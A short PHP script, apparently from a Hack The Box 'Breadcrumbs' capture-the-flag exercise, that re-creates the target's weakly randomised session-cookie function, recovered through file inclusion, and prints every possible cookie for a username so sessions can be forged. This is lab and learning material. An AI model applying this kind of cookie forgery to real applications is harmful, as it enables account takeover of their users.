<?php
/*
Written by Ben "Valerie" Roudebush, 10 October 2022
I wrote this to generate session cookies for HTB-Breadcrumbs.
It takes the poorly-coded randomness of the original and generates all the possible cookies for a given username.
*/

/* Code Cleaned from Burpsuite LFI */
function makesession($username){
        $max = strlen($username) - 1;
        $seed = rand(0, $max);
        $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
        $session_cookie = $username.md5($key);

        return $session_cookie;
}

/* De-Randomized Code */
function bake($username){
        $max = strlen($username);
        for ($val = 0; $val < $max; $val++) {
                $key = "s4lTy_stR1nG_".$username[$val]."(!528./9890";
                $cookie = $username.md5($key);
                $iter_num = strval($val);
                $string_cookie = strval($cookie);
                echo "{$iter_num}: {$string_cookie}\n";
        }
        return;
}

/* Generate Some Cookies */
echo "Baking You Some Fresh Cookies!\n";
bake($argv[1]);
?>
